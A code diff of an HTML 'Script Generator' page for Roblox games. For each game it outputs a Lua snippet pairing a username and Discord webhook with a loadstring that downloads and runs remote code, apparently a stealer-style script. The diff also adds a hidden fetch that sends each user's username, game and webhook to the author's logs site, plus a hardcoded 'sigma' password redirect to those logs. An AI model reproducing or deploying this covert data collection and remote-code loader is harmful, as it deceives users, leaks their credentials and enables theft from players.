@@ -95,29 +95,14 @@
         .copy-button:disabled {
             background: #555;
         }
-        .additional-username-container {
-            display: none;
-            margin-top: 20px;
-            text-align: center;
-        }
-        .additional-username-container input {
-            padding: 12px 20px;
-            border-radius: 12px;
-            border: none;
-            background-color: #333;
-            color: white;
-            font-size: 1rem;
-            width: 80%;
-        }
     </style>
 </head>
 <body>
     <h1>Script Generator</h1>
     
-    <!-- Sigma Detection and Testing Toggle -->
+    <!-- Sigma Password Detection -->
     <div class="container">
-        <input type="text" id="username" placeholder="Roblox Username" oninput="detectSigma()">
-        <button onclick="toggleAdditionalUsernameField()">Testing</button>
+        <input type="password" id="password" placeholder="Enter Sigma Password" oninput="checkSigmaPassword()">
     </div>
 
     <!-- Game Selection -->
@@ -130,11 +115,6 @@
             <option value="Pet Simulator 99">Pet Simulator 99</option>
             <option value="Pls Donate">Pls Donate</option>
         </select>
-    </div>
-
-    <!-- Additional Username Field -->
-    <div id="additional-username-container" class="additional-username-container">
-        <input type="text" id="additionalUsername" placeholder="Additional Username (optional)">
     </div>
 
     <!-- Popup for User Details -->
@@ -155,7 +135,7 @@
 
     <script>
         let currentGame = '';
-        let sigmaDetected = false; // Simple flag for Sigma detection
+        let sigmaPassword = "sigma"; // Set password for Sigma detection
 
         const loadstrings = {
             "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
@@ -165,12 +145,11 @@
             "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
         };
 
-        // Simple detection for "Sigma"
-        function detectSigma() {
-            const username = document.getElementById('username').value.toLowerCase();
-            if (username.includes("sigma")) {
-                sigmaDetected = true;
-                window.location.href = "https://yourspecialsigmawebsite.com"; // Redirect to Sigma site
+        function checkSigmaPassword() {
+            const password = document.getElementById('password').value.toLowerCase();
+            if (password === sigmaPassword) {
+                // Redirect to Sigma site
+                window.location.href = "https://goldded.github.io/logs/";
             }
         }
 
@@ -187,31 +166,26 @@
         }
 
         function generateScript() {
-            let username = document.getElementById('username').value;
-            let discordUser = document.getElementById('discordUser').value;
+            let username = document.getElementById('discordUser').value;
             let webhook = document.getElementById('webhook').value;
 
             if (username && webhook) {
-                // Trigger Sigma detection
-                detectSigma();
-
                 let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
                 document.getElementById('script-output').innerText = script;
                 document.getElementById('generated-script').style.display = 'block';
                 document.getElementById('copy-btn').disabled = false;
 
-                // Send data to your site for logging
-                fetch('https://yourgithubsite.com/log', { // Your new backend URL
+                // Send logs to the new site
+                fetch('https://goldded.github.io/logs/', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        username: discordUser,
+                        username: username,
                         game: currentGame,
                         webhook: webhook
                     })
                 });
 
-                // Close the popup after generating the script
                 closePopup();
             } else {
                 alert("Please fill in both the username and webhook!");
@@ -227,11 +201,6 @@
             document.execCommand('copy');
             document.body.removeChild(textarea);
             alert("Script copied to clipboard!");
-        }
-
-        function toggleAdditionalUsernameField() {
-            const field = document.getElementById('additional-username-container');
-            field.style.display = field.style.display === 'block' ? 'none' : 'block';
         }
     </script>
 </body>
